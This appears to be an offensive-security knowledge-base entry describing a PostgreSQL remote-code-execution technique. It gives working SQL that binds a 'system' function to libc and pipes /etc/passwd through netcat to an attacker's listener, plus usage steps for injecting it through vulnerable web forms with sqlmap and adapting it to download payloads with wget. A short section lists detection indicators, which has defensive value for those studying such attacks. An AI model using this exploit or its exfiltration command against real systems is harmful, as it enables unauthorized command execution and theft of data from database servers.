---
id: 0201e327-7841-4a07-b099-e8e238c58fae
name: PostgreSQL-libc-system-RCE
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:36.051985+00:00'
updated_at: '2023-04-10T20:23:20.722366+00:00'
platforms:
  - Linux
tags:
  - rce
  - postgresql
  - sql-injection
validated: true
---

# PostgreSQL-libc-system-RCE

## Code

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```

## Description

This SQL code snippet creates a user-defined function named 'system' that interfaces with the libc.so.6 library's system() call, enabling the execution of arbitrary shell commands from PostgreSQL queries. It then demonstrates usage by running a command to read and exfiltrate the /etc/passwd file via netcat to an external listener. This is a classic RCE technique exploitable through SQL injection points where the attacker can inject multi-statement SQL.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <attacker IP> | Replace with the IP address of the attacker's netcat listener | 192.168.1.100 |
| <attacker port> | Replace with the port of the attacker's netcat listener | 4444 |

## Usage

Inject or execute this code in a PostgreSQL session with sufficient privileges (e.g., via a vulnerable web form using tools like sqlmap or manual POST requests). Ensure a netcat listener (e.g., [[commands/nc-tcp-listener]]) is running on the specified IP/port beforehand. The function can be reused for other commands by calling SELECT system('other command');. Adapt the shell command for different exfiltration needs, such as wget for payload download.

## Detection

- PostgreSQL logs recording CREATE FUNCTION statements referencing external libraries like libc.so.6 or unusual paths.
- Query audits showing invocations of custom 'system' functions or commands involving pipes (|) and tools like nc.
- Network traffic analysis revealing outbound TCP connections from the database server to unexpected IPs/ports, especially carrying file-like data.
- File integrity monitoring on /lib/x86_64-linux-gnu/libc.so.6 for unauthorized access, though rare.

## Related

- [[procedures/PostgreSQL-Command-Execution-via-libc-system]]
